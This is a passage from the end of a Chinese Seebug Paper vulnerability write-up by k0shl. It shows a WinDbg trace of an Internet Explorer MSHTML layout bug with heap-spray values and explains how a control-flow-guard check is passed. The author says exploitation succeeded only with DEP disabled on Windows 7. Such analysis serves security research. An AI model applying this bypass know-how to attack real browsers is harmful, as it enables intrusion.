<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">MultiColumnBoxBuilder</span><span class="o">::</span><span class="n">HandleColumnBreakOnColumnSpanningElement</span><span class="o">+</span><span class="mh">0x2c3d49</span><span class="o">:</span>
<span class="mi">683</span><span class="n">cfc9a</span> <span class="mi">8</span><span class="n">bb8a4010000</span>    <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">1</span><span class="n">A4h</span><span class="o">]</span> <span class="n">ds</span><span class="o">:</span><span class="mi">002</span><span class="n">b</span><span class="o">:</span><span class="mi">0</span><span class="n">c0c0db0</span><span class="o">=</span><span class="mi">0</span><span class="n">c0c0c0c</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">MultiColumnBoxBuilder</span><span class="o">::</span><span class="n">HandleColumnBreakOnColumnSpanningElement</span><span class="o">+</span><span class="mh">0x2c3d4f</span><span class="o">:</span>
<span class="mi">683</span><span class="n">cfca0</span> <span class="mi">8</span><span class="n">bcf</span>            <span class="n">mov</span>     <span class="n">ecx</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">MultiColumnBoxBuilder</span><span class="o">::</span><span class="n">HandleColumnBreakOnColumnSpanningElement</span><span class="o">+</span><span class="mh">0x2c3d51</span><span class="o">:</span>
<span class="mi">683</span><span class="n">cfca2</span> <span class="n">ff1534afb568</span>    <span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">MSHTML</span><span class="o">!</span><span class="n">__guard_check_icall_fptr</span> <span class="o">(</span><span class="mi">68</span><span class="n">b5af34</span><span class="o">)]</span> <span class="n">ds</span><span class="o">:</span><span class="mi">002</span><span class="n">b</span><span class="o">:</span><span class="mi">68</span><span class="n">b5af34</span><span class="o">=</span><span class="mi">67</span><span class="n">ac4b50</span><span class="c1">//进入CFG check函数</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">t</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">CJSProtocol</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="err">&#39;</span><span class="o">+</span><span class="mh">0xc</span><span class="o">://</span><span class="err">对</span><span class="n">CJSProtocol</span> <span class="n">vftable的值进行检查</span>
<span class="mi">67</span><span class="n">ac4b50</span> <span class="mi">8</span><span class="n">bc0</span>            <span class="n">mov</span>     <span class="n">eax</span><span class="o">,</span><span class="n">eax</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">CElement</span><span class="o">::</span><span class="n">OnGCFilteredForReplacedElem</span><span class="o">:</span>
<span class="mi">67</span><span class="n">ac4b52</span> <span class="n">c3</span>              <span class="n">ret</span>
</pre></div>


<p>这也是有疑惑的地方，在这个CFG check中，会对CJProtocol::&#96;vftable有效性进行检查，但是没有对我们返回值指向的虚函数进行检查，导致我们可以通过这处CFG检查。</p>
<p><img alt="./20170314/7.png" src="https://images.seebug.org/content/images/2017/03/7.png-w331s" /></p>
<p>但是由于所有地址模块都开启了ASLR，而利用面来看的话，并没有地方可以泄露内存信息，也没有其他好用的利用点，这样的话就不好绕过ASLR和DEP，我在关闭win7 DEP的情况下，完成了利用。</p>
<p><img alt="./20170314/8.png" src="https://images.seebug.org/content/images/2017/03/8.png-w331s" /></p>
<p>感谢大家阅读，如果有不当之处，请大家多多交流，谢谢！</p>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/251/">https://paper.seebug.org/251/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/250/"><span aria-hidden="true">&larr;</span> IPAPatch: 免越狱调试、修改第三方App</a>
    
    
      <a class="older-posts" href="/252/">抓住“新代码”的影子  —— 基于GoAhead系列网... <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
        <footer class="post-footer">
          <figure class="author-image">
            <a class="img" href="/users/author/?nickname=k0shl"
               style="background-image: url(https://images.seebug.org/uploads/2017/08/005PzhAMjw8f81c3d8m10j30jg0hawhb.jpg)"><span
                class="hidden">'s Picture</span></a>
          </figure>

          <section class="author">
            <h4><a
                href="/users/author/?nickname=k0shl">k0shl</a>
            </h4>
            <p>阅读更多有关<a
                href="/users/author/?nickname=k0shl">该作者</a>的文章
            </p>
            
            <div class="author-meta">
            </div>
          </section>

          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          

        </footer>
      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
